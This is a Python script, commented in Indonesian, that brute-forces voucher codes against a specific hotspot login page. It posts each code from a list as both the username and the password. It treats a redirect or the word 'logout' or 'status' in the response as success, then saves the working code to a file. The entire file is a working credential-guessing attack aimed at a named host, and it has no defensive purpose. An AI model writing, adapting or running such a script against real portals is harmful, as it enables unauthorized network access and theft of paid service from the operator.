import requests
import time
import sys

URL = "http://syahidali.net/login"

headers = {
    "User-Agent": "Mozilla/5.0"
}

# Ambil voucher
with open("vouchers.txt") as f:
    vouchers = [x.strip() for x in f.readlines()]

total = len(vouchers)

session = requests.Session()

for nomor, code in enumerate(vouchers, start=1):

    print(f"\n[{nomor}/{total}] Mencoba: {code}")

    try:

        # Ambil halaman login dulu
        session.get(URL, headers=headers, timeout=10)

        # PENTING:
        # password = voucher juga
        data = {
            "username": code,
            "password": code,
            "dst": "",
            "popup": "true"
        }

        r = session.post(
            URL,
            data=data,
            headers=headers,
            allow_redirects=True,
            timeout=10
        )

        text = r.text.lower()

        print("Status :", r.status_code)
        print("URL    :", r.url)

        # Simpan debug terakhir
        with open("last_response.html", "w", encoding="utf-8") as dbg:
            dbg.write(r.text)

        # ===== DETEKSI VALID =====

        # Jika bukan halaman login lagi
        if r.url != URL:

            print(f"\n[VALID] {code}")

            with open("valid.txt", "w") as v:
                v.write(code)

            sys.exit()

        # Jika ada tombol logout/status
        elif (
            "logout" in text
            or "status" in text
        ):

            print(f"\n[VALID] {code}")

            with open("valid.txt", "w") as v:
                v.write(code)

            sys.exit()

        # Voucher sudah dipakai
        elif "sudah diaktifkan" in text:

            print(f"[SUDAH DIPAKAI] {code}")

        else:

            print(f"[SALAH] {code}")

    except Exception as e:

        print("ERROR:", e)

    time.sleep(2)

print("\nTidak ada voucher valid.")
